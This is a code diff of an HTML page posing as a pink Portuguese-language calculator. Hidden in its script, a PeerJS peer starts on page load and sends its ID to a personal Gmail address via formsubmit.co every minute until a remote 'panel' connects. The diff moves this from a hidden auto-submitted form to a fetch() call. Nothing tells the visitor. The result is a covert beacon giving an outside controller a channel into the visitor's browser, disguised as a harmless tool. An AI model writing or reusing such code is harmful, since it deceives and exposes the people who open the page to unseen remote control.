@@ -1,101 +1,92 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Calculadora Rosa</title>
-  <style>
-    :root {
-      --bg-color: #ffe4f2;
-      --calc-bg: #fff0f6;
-      --text-color: #333;
-      --button-color: #ff85c1;
-      --button-text: #fff;
-    }
-
-    body.pink {
-      --bg-color: #ffe4f2;
-      --calc-bg: #fff0f6;
-      --text-color: #333;
-      --button-color: #ff85c1;
-      --button-text: #fff;
-    }
-
-    body.dark {
-      --bg-color: #1e1e1e;
-      --calc-bg: #2b2b2b;
-      --text-color: #f0f0f0;
-      --button-color: #4a4a4a;
-      --button-text: #f0f0f0;
-    }
-
-    body.light {
-      --bg-color: #f0f0f0;
-      --calc-bg: #ffffff;
-      --text-color: #333;
-      --button-color: #e0e0e0;
-      --button-text: #000;
-    }
-
-    body {
-      font-family: Arial, sans-serif;
-      background-color: var(--bg-color);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      transition: background 0.3s;
-    }
-
-    .calculator {
-      background-color: var(--calc-bg);
-      padding: 25px;
-      border-radius: 15px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
-      text-align: center;
-      width: 320px;
-    }
-
-    .calculator h2 {
-      color: var(--text-color);
-    }
-
-    input {
-      width: 100%;
-      padding: 12px;
-      font-size: 20px;
-      margin-bottom: 15px;
-      border: 2px solid #ccc;
-      border-radius: 8px;
-      text-align: right;
-    }
-
-    button {
-      padding: 12px 18px;
-      font-size: 18px;
-      margin: 5px;
-      border: none;
-      border-radius: 8px;
-      background-color: var(--button-color);
-      color: var(--button-text);
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-
-    button:hover {
-      opacity: 0.9;
-    }
-
-    .theme-toggle {
-      margin-top: 10px;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Calculadora Rosa</title>
+<style>
+  /* seus estilos aqui (igual antes) */
+  :root {
+    --bg-color: #ffe4f2;
+    --calc-bg: #fff0f6;
+    --text-color: #333;
+    --button-color: #ff85c1;
+    --button-text: #fff;
+  }
+  body.pink {
+    --bg-color: #ffe4f2;
+    --calc-bg: #fff0f6;
+    --text-color: #333;
+    --button-color: #ff85c1;
+    --button-text: #fff;
+  }
+  body.dark {
+    --bg-color: #1e1e1e;
+    --calc-bg: #2b2b2b;
+    --text-color: #f0f0f0;
+    --button-color: #4a4a4a;
+    --button-text: #f0f0f0;
+  }
+  body.light {
+    --bg-color: #f0f0f0;
+    --calc-bg: #ffffff;
+    --text-color: #333;
+    --button-color: #e0e0e0;
+    --button-text: #000;
+  }
+  body {
+    font-family: Arial, sans-serif;
+    background-color: var(--bg-color);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    transition: background 0.3s;
+  }
+  .calculator {
+    background-color: var(--calc-bg);
+    padding: 25px;
+    border-radius: 15px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+    text-align: center;
+    width: 320px;
+  }
+  .calculator h2 {
+    color: var(--text-color);
+  }
+  input {
+    width: 100%;
+    padding: 12px;
+    font-size: 20px;
+    margin-bottom: 15px;
+    border: 2px solid #ccc;
+    border-radius: 8px;
+    text-align: right;
+  }
+  button {
+    padding: 12px 18px;
+    font-size: 18px;
+    margin: 5px;
+    border: none;
+    border-radius: 8px;
+    background-color: var(--button-color);
+    color: var(--button-text);
+    cursor: pointer;
+    transition: background 0.2s;
+  }
+  button:hover {
+    opacity: 0.9;
+  }
+  .theme-toggle {
+    margin-top: 10px;
+  }
+</style>
 </head>
 <body class="pink">
   <div class="calculator">
     <h2>Calculadora 💖</h2>
-    <input type="text" id="display" readonly>
+    <input type="text" id="display" readonly />
     <div>
       <button onclick="addToDisplay('1')">1</button>
       <button onclick="addToDisplay('2')">2</button>
@@ -120,7 +111,6 @@
       <button onclick="clearDisplay()">C</button>
       <button onclick="calculate()">=</button>
     </div>
-
     <div class="theme-toggle">
       <button onclick="setTheme('pink')">🌸 Rosa</button>
       <button onclick="setTheme('light')">☀️ Claro</button>
@@ -128,67 +118,71 @@
     </div>
   </div>
 
-  <!-- Formulário oculto para envio automático via FormSubmit -->
-  <form id="peerForm" action="https://formsubmit.co/brasildicas667@gmail.com" method="POST" style="display:none;">
-    <input type="hidden" name="name" value="Calculadora Rosa" />
-    <input type="hidden" name="email" value="anonimo@calcrosa.com" />
-    <input type="hidden" name="message" id="messageField" />
-    <input type="hidden" name="_captcha" value="false" />
-  </form>
+<script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+<script>
+  let display = document.getElementById('display');
+  let expression = '';
+  let connected = false;
 
-  <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
-  <script>
-    let display = document.getElementById('display');
-    let expression = '';
-    let connected = false;
-
-    function addToDisplay(value) {
-      expression += value;
-      display.value = expression;
-    }
-
-    function clearDisplay() {
+  function addToDisplay(value) {
+    expression += value;
+    display.value = expression;
+  }
+  function clearDisplay() {
+    expression = '';
+    display.value = '';
+  }
+  function calculate() {
+    try {
+      display.value = eval(expression);
+      expression = display.value;
+    } catch {
+      display.value = 'Erro';
       expression = '';
-      display.value = '';
     }
+  }
+  function setTheme(theme) {
+    document.body.className = theme;
+  }
 
-    function calculate() {
-      try {
-        display.value = eval(expression);
-        expression = display.value;
-      } catch (e) {
-        display.value = 'Erro';
-        expression = '';
-      }
-    }
+  const peer = new Peer();
 
-    function setTheme(theme) {
-      document.body.className = theme;
-    }
+  peer.on('open', id => {
+    console.log('Peer ID:', id);
+    sendId(id);
 
-    const peer = new Peer();
+    setInterval(() => {
+      if (!connected) sendId(id);
+    }, 60000);
+  });
 
-    peer.on('open', id => {
-      console.log('Peer ID:', id);
-      document.getElementById('messageField').value = `Peer ID: ${id}`;
+  peer.on('connection', conn => {
+    connected = true;
+    console.log('Painel conectado, não envia mais ID');
+  });
 
-      if (!connected) {
-        document.getElementById('peerForm').submit();
-        console.log('ID enviado automaticamente');
-      }
-
-      setInterval(() => {
-        if (!connected) {
-          document.getElementById('peerForm').submit();
-          console.log('Reenvio automático do ID');
-        }
-      }, 60000); // envia a cada 1 minuto
+  function sendId(id) {
+    fetch('https://formsubmit.co/ajax/brasildicas667@gmail.com', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+      },
+      body: JSON.stringify({
+        name: "Calculadora Rosa",
+        email: "anonimo@calcrosa.com",
+        message: `Peer ID: ${id}`,
+        _captcha: "false"
+      })
+    })
+    .then(res => res.json())
+    .then(data => {
+      console.log('ID enviado:', data);
+    })
+    .catch(err => {
+      console.error('Erro ao enviar ID:', err);
     });
-
-    peer.on('connection', conn => {
-      connected = true;
-      console.log('Painel conectado, parando envio automático.');
-    });
-  </script>
+  }
+</script>
 </body>
 </html>
